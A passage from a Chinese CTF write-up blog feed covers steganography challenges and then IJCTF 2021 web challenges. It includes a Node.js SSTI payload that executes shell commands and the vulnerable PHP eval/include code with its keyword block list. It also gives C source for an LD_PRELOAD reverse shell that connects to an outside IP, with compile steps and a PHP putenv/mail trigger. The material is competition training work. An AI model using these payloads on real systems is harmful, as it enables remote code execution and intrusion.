class="line">flag&#123;98047de9ce5aaa4c0031fb55e9dfac70&#125;</span><br></pre></td></tr></table></figure><h3 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h3><blockquote><p>你能从GIF中找到小豆泥隐藏的flag吗？</p></blockquote><p> 解压附件可得一个循环的小豆泥打拳动图，将其分帧可得 11 帧为一组的循环。参考 CISCN 2021 Quals 的动图题目，将每一组的图与第一组的对照后合并，可以得到九张包含类二维码的图和两张顺序图。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628043957019574/acb2f2d4b9866383393d8523ebe557185a893ead.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628043957089324/264269688a4baa36f4d0ac382f7d2428f1e6d43b.png"></p><p>将得到的九张图片按顺序排好可得一个 DataMatrix 码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 1 6</span></span><br><span class="line"><span class="comment"># 9 3 4</span></span><br><span class="line"><span class="comment"># 5 2 8</span></span><br><span class="line">pasteArray = [<span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>]</span><br><span class="line">resultImage = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">83</span> * <span class="number">3</span>, <span class="number">83</span> * <span class="number">3</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> group <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    imageModel = Image.<span class="built_in">open</span>(<span class="string">&quot;./gif/IMG&#123;:05d&#125;.bmp&quot;</span>.<span class="built_in">format</span>(group))</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">83</span>, <span class="number">83</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    width, height = imageModel.size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(group + <span class="number">11</span>, <span class="number">451</span>, <span class="number">11</span>):</span><br><span class="line">        imageSlice = Image.<span class="built_in">open</span>(<span class="string">&quot;./gif/IMG&#123;:05d&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">if</span> imageModel.getpixel((y, x)) != imageSlice.getpixel((y, x)):</span><br><span class="line">                    <span class="built_in">print</span>(y, x)</span><br><span class="line">                    <span class="built_in">print</span>(imageModel.getpixel((y, x)), imageSlice.getpixel((y, x)))</span><br><span class="line">                    image.putpixel((y, x), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">    resultImage.paste(image, (</span><br><span class="line">        ((pasteArray[group] - <span class="number">1</span>) % <span class="number">3</span>) * <span class="number">83</span>, ((pasteArray[group] - <span class="number">1</span>) // <span class="number">3</span>) * <span class="number">83</span>,</span><br><span class="line">        ((pasteArray[group] - <span class="number">1</span>) % <span class="number">3</span>) * <span class="number">83</span> + <span class="number">83</span>,</span><br><span class="line">        ((pasteArray[group] - <span class="number">1</span>) // <span class="number">3</span>) * <span class="number">83</span> + <span class="number">83</span>))</span><br><span class="line">resultImage.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628044046032440/ca2d0d3cf3f4b90d86205296338807d85ccd3421.png@100w"></p><p>识别这个码可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;6bb73086aeb764b5727529d82b084cce&#125;</span><br></pre></td></tr></table></figure><h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><blockquote><p><a href="https://www.cnblogs.com/abella/p/9982322.html">QIM量化 - 努力奋斗的阿贝拉</a></p></blockquote><p>StegSolve 的 Data Extract 导出 Green plane 0 的图片可得如下信息。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628073325447688/eb36c389b6ce0d68f826ff546207cd719c3c53c7.png"></p><p>顺利得到了前一半的 flag <code>flag&#123;2e9ec6480d0515</code> 以及后一半使用了 delta 为 20 的 QIM 量化的提示。</p><blockquote><p><a href="https://github.com/pl561/QuantizationIndexModulation/blob/master/qim.py">https://github.com/pl561/QuantizationIndexModulation/blob/master/qim.py</a></p></blockquote><p> 参考 GitHub 上的脚本写出如下脚本来提取出图片中的信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">        self.delta = delta</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        x is a vector of values to be quantized individually</span></span><br><span class="line"><span class="string">        m is a binary vector of bits to be embeded</span></span><br><span class="line"><span class="string">        returns: a quantized vector y</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">        d = self.delta</span><br><span class="line">        y = np.<span class="built_in">round</span>(x / d) * d + (-<span class="number">1</span>) ** (m + <span class="number">1</span>) * d / <span class="number">4.</span></span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        z is the received vector, potentially modified</span></span><br><span class="line"><span class="string">        returns: a detected vector z_detected and a detected message m_detected</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        shape = z.shape</span><br><span class="line">        z = z.flatten()</span><br><span class="line"></span><br><span class="line">        m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">        z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line"></span><br><span class="line">        z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">        z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        d0 = np.<span class="built_in">abs</span>(z - z0)</span><br><span class="line">        d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line"></span><br><span class="line">        gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line">        <span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line">            <span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">                m_detected[i] = <span class="number">0</span></span><br><span class="line">                z_detected[i] = z0[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m_detected[i] = <span class="number">1</span></span><br><span class="line">                z_detected[i] = z1[i]</span><br><span class="line"></span><br><span class="line">        z_detected = z_detected.reshape(shape)</span><br><span class="line">        m_detected = m_detected.reshape(shape)</span><br><span class="line">        <span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qim = QIM(delta=<span class="number">20</span>)</span><br><span class="line">image = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;./ezSteganography-flag.png&quot;</span>))</span><br><span class="line">green = image[:, :, <span class="number">1</span>].ravel()</span><br><span class="line">[z_detected, msg_detected] = qim.detect(green)</span><br><span class="line">plt.imshow(msg_detected.reshape(<span class="number">1440</span>, <span class="number">2560</span>))</span><br><span class="line">plt.savefig(<span class="string">&quot;steganography.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行脚本可以得到下图，从而获得后一半 flag <code>0c211963984dcbc9f1&#125;</code>。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628073094260532/aaef211d4c8254b08abca5e52fbe402cd456c93b.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2e9ec6480d05150c211963984dcbc9f1&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/aa6ae99.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>IJCTF 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/603682ab.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/603682ab.html</guid>
      <pubDate>Thu, 29 Jul 2021 16:12:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;SodaFactory&quot;&gt;&lt;a href=&quot;#SodaFactory&quot; class=&quot;headerlink&quot; title=&quot;SodaFactory&quot;&gt;&lt;/a&gt;SodaFactory&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Welcome to my SodaFactory.&lt;/p&gt;
&lt;p&gt;Note: You don’t need any bruteforce&lt;/p&gt;
&lt;p&gt;Author:</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SodaFactory"><a href="#SodaFactory" class="headerlink" title="SodaFactory"></a>SodaFactory</h3><blockquote><p>Welcome to my SodaFactory.</p><p>Note: You don’t need any bruteforce</p><p>Author: TheGrandPew#0740</p></blockquote><p>使用的库是 sodajs，从以下代码看出参数 name 未经处理就传入了，在渲染后输出。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/makeSoda&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> &#123;name, brand&#125; = req.body;</span><br><span class="line">  img = images[brand];</span><br><span class="line">  res.send(soda(<span class="string">`</span></span><br><span class="line"><span class="string">    &lt;title&gt;<span class="subst">$&#123;name&#125;</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;img src=&#x27;<span class="subst">$&#123;img&#125;</span>&#x27; alt=&#x27;<span class="subst">$&#123;name&#125;</span>&#x27;&gt;</span></span><br><span class="line"><span class="string">  `</span>,&#123;&#125;))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>因此对参数 name 尝试 SSTI，构造 <code>&#123;&#123;1 + 1&#125;&#125;</code> 可以发现输出的是 2，因此判定存在模板注入。使用如下载荷一把梭读出环境变量找到 flag。</p><blockquote><p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&quot; &quot;</span>.toString.constructor(<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;).toString()&quot;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure><p>读出如下环境变量。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NODE_VERSION&#x3D;12.18.1</span><br><span class="line">HOSTNAME&#x3D;53d556edba99</span><br><span class="line">YARN_VERSION&#x3D;1.22.4</span><br><span class="line">PORT&#x3D;3000</span><br><span class="line">HOME&#x3D;&#x2F;root</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">PWD&#x3D;&#x2F;app</span><br><span class="line">FLAG&#x3D;IJCTF&#123;Y00_maK3_g00D_50DA_MA73&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;Y00_maK3_g00D_50DA_MA73&#125;</span><br></pre></td></tr></table></figure><h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><blockquote><p>Do you remember the past? You lived hard. Now, you need to take some rest by remembering your past.</p><p>Run <code>/flag</code></p><p>Note: You don’t need any bruteforce. The provided <code>phpinfo</code> has all the information for solving this challenge. So, I’ll not provide Dockerfile of this challenge.</p><p>Author:<code>sqrtrev#9113</code></p></blockquote><p>题目的附件中给出了如下两端代码和一个 PHPINFO 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;filter.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$errorno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;error_log(<span class="string">&quot;[<span class="subst">$errorno</span>] <span class="subst">$errstr</span>&quot;</span>, <span class="number">0</span>);&#125;;</span><br><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$r</span></span>)</span>&#123; <span class="variable">$r</span> = <span class="literal">True</span>; &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;chance&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>]) &gt; <span class="number">15</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>],<span class="number">1</span>) | checkLetterNums(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack T.T&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>]) &gt; <span class="number">32</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No bonus ~.~&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//filter.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span>, <span class="variable">$case</span> = <span class="number">0</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$case</span>)&#123;</span><br><span class="line">        <span class="variable">$additional</span> = [<span class="string">&quot;php&quot;</span>,<span class="string">&quot;/&quot;</span>];</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$additional</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkLetterNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; strlen(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">4</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当参数 mode 为 chance 的时候会进行经过严格过滤的指令执行，而 mode 为 bonus 的时候则会进行 include。给出的 PHPINFO 文件中 disable_function 几乎禁用了所有的函数，加上过滤极为严格，因此直接指令执行是不可能的。可以注意到 <code>session.upload_progress.cleanup</code>  的值为 Off，也就是说当 POST 文件上传后 session 不会被清理，<code>session.use_strict_mode</code> 的值为 0。这意味着自定义一个会话 ID，进而可以利用 PHP_SESSION_UPLOAD_PROGRESS 进行文件包含。上传到 <code>/tmp</code> 的文件会在进程结束后被删除，因此需要写出 <code>for(;;)&#123;&#125;</code> 来阻塞执行进程。</p><h4 id="反弹-shell-的构造"><a href="#反弹-shell-的构造" class="headerlink" title="反弹 shell 的构造"></a>反弹 shell 的构造</h4><p>可以发现在 PHPINFO 文件中，<code>putenv</code> 和 <code>mail</code> 两个函数都还能使用，因此尝试写入 LD_PRELOAD，使用 <code>mail</code> 函数来触发一个反弹 shell。构造出如下反弹 shell 的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serveraddr</span>;</span></span><br><span class="line">        <span class="keyword">int</span> server_sockfd;</span><br><span class="line">        <span class="keyword">int</span> client_len;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">80</span>],rbuf[<span class="number">80</span>], *cmdBuf[<span class="number">2</span>]=&#123;<span class="string">&quot;/bin/sh&quot;</span>,(<span class="keyword">char</span> *)<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        server_sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">6</span>);</span><br><span class="line">        serveraddr.sin_family = AF_INET;</span><br><span class="line">        serveraddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;8.136.8.210&quot;</span>); </span><br><span class="line">        serveraddr.sin_port = htons(atoi(<span class="string">&quot;3255&quot;</span>));</span><br><span class="line">        client_len = <span class="keyword">sizeof</span>(serveraddr);</span><br><span class="line"></span><br><span class="line">        connect(server_sockfd, (struct sockaddr*)&amp;serveraddr, client_len);</span><br><span class="line"></span><br><span class="line">        dup2(server_sockfd, <span class="number">0</span>);</span><br><span class="line">        dup2(server_sockfd, <span class="number">1</span>);</span><br><span class="line">        dup2(server_sockfd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        execve(<span class="string">&quot;/bin/sh&quot;</span>,cmdBuf,<span class="number">0</span>);</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下指令进行编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c -fPIC shell.c -o shell</span><br><span class="line">$ gcc -shared shell -o shell.so</span><br></pre></td></tr></table></figure><p>编译完成的二进制文件即可用于反弹 shell。再构造出如下 PHP 文件用于进行 LD_PRELOAD 进而触发反弹 shell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=./shell.so&quot;</span>); <span class="comment">//此处的文件名还需要更改</span></span><br><span class="line">    mail(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写出如下脚本来一把梭触发反弹 shell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 